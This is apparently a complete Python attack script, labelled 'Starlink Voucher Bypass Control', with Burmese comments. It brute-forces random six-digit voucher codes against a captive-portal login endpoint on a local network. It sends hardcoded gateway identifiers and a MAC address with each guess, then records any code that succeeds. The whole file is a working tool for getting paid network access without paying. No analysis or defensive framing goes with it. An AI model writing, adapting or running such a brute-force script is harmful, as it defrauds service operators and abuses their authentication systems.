import time
import random
import os
import sys
import requests

# အရောင်များ
RED = '\033[91m'      # Fail
GREEN = '\033[92m'    # Success
WHITE = '\033[97m'    # Testing
CYAN = '\033[96m'
YELLOW = '\033[93m'
END = '\033[0m'

url = "http://10.44.77.240:2060/expire_tip"

def start_scanning():
    os.system('clear')
    print(f"{CYAN}[+] Starlink Voucher Bypass Control{END}")
    print(f"{WHITE}[+] Range: 000000 - 999999 (Randomly Searching){END}")
    print(f"{YELLOW}[!] Scanning in progress...{END}\n")
    
    time.sleep(1)
    print(f"{CYAN}[+] Checking Bypass...{END}")
    print(f"{WHITE}[+] Connection to Server: {GREEN}OK{END}")
    print(f"{WHITE}[*] Currently Testing codes...{END}\n")

    while True:
        code = str(random.randint(0, 999999)).zfill(6)
        
        # လက်ရှိစမ်းနေတဲ့ code ကို အဖြူရောင်နဲ့ပြ (တစ်ကြောင်းတည်းပေါ်ရန်)
        sys.stdout.write(f"{WHITE}\r[*] Trying: {code}{END}")
        sys.stdout.flush()
        
        params = {
            'gw_id': '984a6ba4b7ef',
            'gw_sn': 'H1TB01V00212C',
            'gw_address': '192.168.110.1',
            'mac': 'a6:a9:6f:93:0b:bb',
            'voucher': code
        }

        try:
            res = requests.get(url, params=params, timeout=1.5)
            
            # မရရင် အနီရောင်စာတန်းကို အပေါ်သို့ တန်းစီပြီး ကျလာစေမည်
            if "failed" in res.text.lower() or "expire" in res.text.lower():
                print(f"\n{RED}Fail Code: {code}{END}")
            
            # ရရင် အစိမ်းရောင်နဲ့ပြပြီး ရပ်မည်
            elif res.status_code == 200:
                print(f"{GREEN}\n\n[!!!] SUCCESS FOUND: {code}{END}")
                with open("success.txt", "a") as f:
                    f.write(f"Voucher: {code} | {time.ctime()}\n")
                break
        except:
            # Connection error ဖြစ်ရင်လည်း အနီရောင်နဲ့ပဲပြပေးထားမည်
            print(f"\n{RED}Error: {code} (No Connection){END}")
        
        time.sleep(0.1)

if __name__ == "__main__":
    start_scanning()
